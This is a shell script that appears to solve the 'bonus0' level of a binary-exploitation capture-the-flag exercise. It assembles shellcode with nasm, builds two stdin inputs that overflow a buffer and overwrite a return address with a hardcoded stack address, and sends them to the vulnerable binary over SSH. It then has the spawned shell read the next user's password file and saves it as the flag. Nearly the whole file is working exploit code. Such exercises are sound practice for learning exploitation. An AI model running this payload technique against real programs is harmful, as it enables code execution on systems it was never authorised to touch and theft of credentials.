#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# ######### #
# SHELLCODE #
# ######### #

generate_exploit_shellcode() {
    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d);

    nasm -f elf32 "$CURR_DIR_PATH/data/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    unset tmpdir shellcode;
    return 0;
}

# #### #
# MAIN #
# #### #

main() {
    host="${host:-localhost}";
    port="${port:-4242}";
    username="${username:-bonus0}";
    password="${password}";
    flag="";

    shellcode="$(generate_exploit_shellcode)" || { log "Error: failed to build shellcode."; return 1; };
    shellcode_addr='\324\355\377\277';

    user_input_1="AAAAAAAAAAAAAAAAAAAA\n"
    user_input_2="BBBBBBBBB${shellcode_addr}BBBBBBB${shellcode}\n"

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; };
    flag="$(ssh_exec_via_socket "$host" "$port" "$username" "{ \
        printf '%b' '${user_input_1}'; sleep 1.0; \
        printf '%b' '${user_input_2}'; sleep 1.0; \
        printf '%s\\n' 'cat /home/user/bonus1/.pass'; \
    } | env -i ./bonus0 2>/dev/null")";
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    echo -n "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
